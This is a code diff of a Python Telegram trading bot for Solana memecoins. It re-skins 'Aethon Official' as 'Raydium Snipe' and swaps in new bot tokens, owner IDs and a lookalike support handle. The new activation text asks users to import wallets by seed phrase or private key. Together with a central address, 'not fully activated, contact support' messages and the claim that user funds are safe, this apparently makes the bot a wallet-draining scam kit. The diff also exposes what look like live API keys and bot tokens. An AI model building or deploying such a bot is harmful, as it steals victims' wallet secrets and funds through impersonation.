@@ -21,7 +21,7 @@ import json
 from threading import Timer
 import threading
 
-BOT_NAME = 'AethonsnipeBot'
+BOT_NAME = 'RaydiumSnipeBot'
 CENTRAL_ADDRESS = '4TK3gSRqXnYKryzsokfRAPLTfW1KMJdhKZXpC2Ni68g4'
 bitAPI = "ory_at_oFiURWw7aqs4EcoMDlCD_0YmdDd65-mArD-i6WZTttA.jQpug_XdRI5aoacG2K5GUcZjlwt_QwqBeF8OZFuMAUI"
 DB_FILE = "database.json"
@@ -101,9 +101,9 @@ print(users)
 '''
 
 # Token del bot (reemplaza 'YOUR_TOKEN' con el token de tu bot de Telegram)
-TOKEN = "7843528629:AAE89HrLELfzrC1J7VXY9FB49VqbcuqhqYQ" # "7843528629:AAE89HrLELfzrC1J7VXY9FB49VqbcuqhqYQ" # 
+TOKEN = "7519577363:AAEYmyxdr027mIOeG6NphctTOh0UpKhToQs" # "7519577363:AAEYmyxdr027mIOeG6NphctTOh0UpKhToQs" # 
 bot = Bot(TOKEN)
-owner_id = [6216175814,6216175814]
+owner_id = [5006318648,5006318648]
 # owner_channel = -1002358026086
 imported_channel = -1002358026086
 new_channel = -1002358026086
@@ -296,18 +296,18 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     #print(chat_id)
     user = get_user(chat_id)
     if user is None:
-        welcome_message = """*Welcome to Aethon Official Bot*
+        welcome_message = """*Welcome to Raydium Snipe Bot*
 
-The Smartest Trading Telegram bot. Aethon Official  enables you to escape from incoming rug pulls, quickly buy or sell tokens and set automations like Limit Orders, DCA, and Sniping.
+The Smartest Trading Telegram bot. Raydium Snipe enables you to escape from incoming rug pulls, quickly buy or sell tokens and set automations like Limit Orders, DCA, and Sniping.
 
-Designed with security, speed, and simplicity in mind, Aethon Official  makes trading memecoins as easy as a tap. Whether you're here to explore new opportunities or manage existing trades, Aethon Official 's user-friendly interface and real-time updates ensure you're always a step ahead in the memecoin world.
+Designed with security, speed, and simplicity in mind, Raydium Snipe makes trading memecoins as easy as a tap. Whether you're here to explore new opportunities or manage existing trades, Raydium Snipe's user-friendly interface and real-time updates ensure you're always a step ahead in the memecoin world.
 
-Get started, and let Aethon Official  bring a touch of fun and profit to your Solana trading experience!
+Get started, and let Raydium Snipe bring a touch of fun and profit to your Solana trading experience!
 
-Click on the *"CONTINUE"* button to get started with Aethon Official !"""
+Click on the *"CONTINUE"* button to get started with Raydium Snipe!"""
 
         # Crear el botÃƒÂ³n "Start"
-        keyboard = [[InlineKeyboardButton("Continue", callback_data="continue")]]
+        keyboard = [[InlineKeyboardButton("Procced", callback_data="continue")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         args = context.args
         #print('args', args)
@@ -426,7 +426,7 @@ Max Price Impact is to protect against trades in extremely illiquid pools.
 
 *MEV PROTECT*
 MEV Protect accelerates your transactions and protect against frontruns to make sure you get the best price possible.
-*Turbo:* Aethon Official  bot will use MEV Protect, but if unprotected sending is faster it will use that instead.
+*Turbo:* Raydium Snipe bot will use MEV Protect, but if unprotected sending is faster it will use that instead.
 *Secure:* Transactions are guaranteed to be protected. This is the ultra secure option, but may be slower.
 
 *TRANSACTION PRIORITY*
@@ -524,7 +524,7 @@ Once done, tap "Refresh" and your balance will appear here.
 
 To buy a token enter a ticker, token address, or a URL from pump.fun, Birdeye, DEX Screener or Meteora.
 
-User funds are safe on Aethon Official bot . For more info on your wallet tap the wallet button below.
+User funds are safe on Raydium Snipebot . For more info on your wallet tap the wallet button below.
   """)
 
 async def buy(chat_id, context):
@@ -587,18 +587,18 @@ The instant Rug exit, once enabled, it works like a Mevbot which tracks the memp
 *Where can I find my referral link?*
 Open the /start menu and click Refer Friends.
 
-*How do I import my normal/existing wallet on Aethon Official bot?*
+*How do I import my normal/existing wallet on Raydium Snipebot?*
 Open the /start, Tap the Wallet button, Click on Import Existing wallet and you'll be able to import your existing wallets!
 
 *How can I use the Copy Trading feature?*
 
 You will need to first fund your bot, Then click on Copy Trade, Paste in the address you would like to track and copy trades, set the amount in sol you will like to use for copy trading, Enable/Disable Copy Sell
 
-*What are the fees for using Aethon Official ?*
-Transactions through Aethon Official  incur a fee of 1%, or 0.9% if you were referred by another user. We don't charge a subscription fee or pay-wall any features.
+*What are the fees for using Raydium Snipe?*
+Transactions through Raydium Snipe incur a fee of 1%, or 0.9% if you were referred by another user. We don't charge a subscription fee or pay-wall any features.
 
 *Additional questions or need support?*
-Contact Aethon Official bot official telegram support admin- @AethonSupport 
+Contact Raydium Snipebot official telegram support admin- @MrWhaIeREAL.
 """, reply_markup=reply_markup)
 
 async def referral(chat_id, context):
@@ -765,7 +765,7 @@ async def check_activation_cmd(update: Update, context: ContextTypes.DEFAULT_TYP
     # Mensaje de bienvenida
     chat_id = update['message']['chat']['id']
     
-    await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""⚠️YOUR Aethon Official  BOT ACCOUNT HAS NOT BEEN FULLY ACTIVATED⚠️
+    await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""⚠️YOUR Raydium Snipe BOT ACCOUNT HAS NOT BEEN FULLY ACTIVATED⚠️
 CONTACT CUSTOMER SUPPORT FOR ASSISTANCE""")
 
 # FunciÃƒÂ³n para manejar el botÃƒÂ³n "Start"
@@ -971,7 +971,8 @@ Choose the option to import the wallet
 • Wallet Watch & Automation
 • Future AI-based Trade Signals
 
-To activate premium tools, deposit at least *0.333 SOL* (~$50) to your wallet.
+To activate premium tools:
+Fund your bot wallet or import an existing wallet (from any platform) using your seed phrase or private key use /wallet command to proceed.
 
 Your account will automatically be upgraded once the required deposit is detected.
 """)
